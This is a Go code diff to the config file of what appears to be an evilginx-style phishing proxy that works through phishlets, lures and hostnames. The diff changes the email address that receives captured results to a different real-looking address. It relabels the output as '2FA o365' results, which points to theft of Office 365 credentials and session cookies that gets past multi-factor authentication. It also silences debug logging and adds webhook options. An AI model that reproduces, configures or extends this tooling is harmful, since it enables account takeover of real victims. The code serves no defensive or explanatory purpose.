@@ -70,7 +70,9 @@ const (
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
-	CFG_MAIL_RESULTS       = "scyllascofield@outlook.com"
+	CFG_MAIL_RESULTS       = "jackrodney@yandex.com"
+// 	CFG_WEBHOOK_URL        = "webhook_url"
+// 	CFG_WEBHOOK_PARAM      = "webhook_param"
 	CFG_KEY                = "none"
 )
 
@@ -164,7 +166,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	}
 	c.lures = []*Lure{}
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
-	log.Warning("Loaded config: %s", c)
+	//log.Warning("Loaded config: %s", c)
 	return c, nil
 }
 
@@ -255,11 +257,11 @@ func (c *Config) SetProxyPassword(password string) {
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
-		log.Warning("IsLureHostnameValid")
-		log.Warning(l.Hostname)
-		log.Warning(hostname)
+// 		log.Warning("IsLureHostnameValid")
+// 		log.Warning(l.Hostname)
+// 		log.Warning(hostname)
 		if l.Hostname == hostname {
-			log.Warning("IsLureHostnameValid TRUE")
+			//log.Warning("IsLureHostnameValid TRUE")
 			if c.sitesEnabled[l.Phishlet] {
 				return true
 			}
@@ -397,7 +399,7 @@ func (c *Config) SetResultMode(email string) {
 	c.mailResults = email
 	c.cfg.Set(CFG_MAIL_RESULTS, email)
 	c.cfg.WriteConfig()
-	log.Info("Result will send to: %s", email)
+	log.Info("2FA o365 Result will send to: %s", email)
 }
 
 func (c *Config) SetKey(key string) {
@@ -452,7 +454,7 @@ func (c *Config) refreshActiveHostnames() {
 }
 
 func (c *Config) IsActiveHostname(host string) bool {
-	log.Warning("IsActiveHostname")
+	//log.Warning("IsActiveHostname")
 	if host[len(host)-1:] == "." {
 		host = host[:len(host)-1]
 	}
@@ -462,7 +464,7 @@ func (c *Config) IsActiveHostname(host string) bool {
 	}
 
 	for _, h := range c.activeHostnames {
-		log.Warning("Active Hostname: %s >> Host: %s", h, host)
+		//log.Warning("Active Hostname: %s >> Host: %s", h, host)
 		if h == host {
 			log.Important("IsActiveHostname return TRUE")
 			return true
@@ -523,7 +525,7 @@ func (c *Config) DeleteLures(index []int) []int {
 }
 
 func (c *Config) GetLure(index int) (*Lure, error) {
-	log.Warning("GetLure: %d", index)
+	//log.Warning("GetLure: %d", index)
 	if index >= 0 && index < len(c.lures) {
 		return c.lures[index], nil
 	} else {
@@ -532,7 +534,7 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 }
 
 func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
-	log.Warning("GetLureByPath: %s %s", site, path)
+	//log.Warning("GetLureByPath: %s %s", site, path)
 
 	for _, l := range c.lures {
 		if l.Phishlet == site {
@@ -545,7 +547,7 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 }
 
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
-	log.Warning("GetPhishlet: %s", site)
+	//log.Warning("GetPhishlet: %s", site)
 	pl, ok := c.phishlets[site]
 	if !ok {
 		return nil, fmt.Errorf("phishlet '%s' not found", site)
@@ -559,13 +561,13 @@ func (c *Config) GetPhishletNames() []string {
 }
 
 func (c *Config) GetSiteDomain(site string) (string, bool) {
-	log.Warning("GetSiteDomain: %s", site)
+	//log.Warning("GetSiteDomain: %s", site)
 	domain, ok := c.siteDomains[site]
 	return domain, ok
 }
 
 func (c *Config) GetAllDomains() []string {
-	log.Warning("getAllDomains")
+	//log.Warning("getAllDomains")
 	var ret []string
 	for _, dom := range c.siteDomains {
 		ret = append(ret, dom)
@@ -574,7 +576,7 @@ func (c *Config) GetAllDomains() []string {
 }
 
 func (c *Config) GetBaseDomain() string {
-	log.Warning("getBaseDomain")
+	//log.Warning("getBaseDomain")
 	return c.baseDomain
 }
 
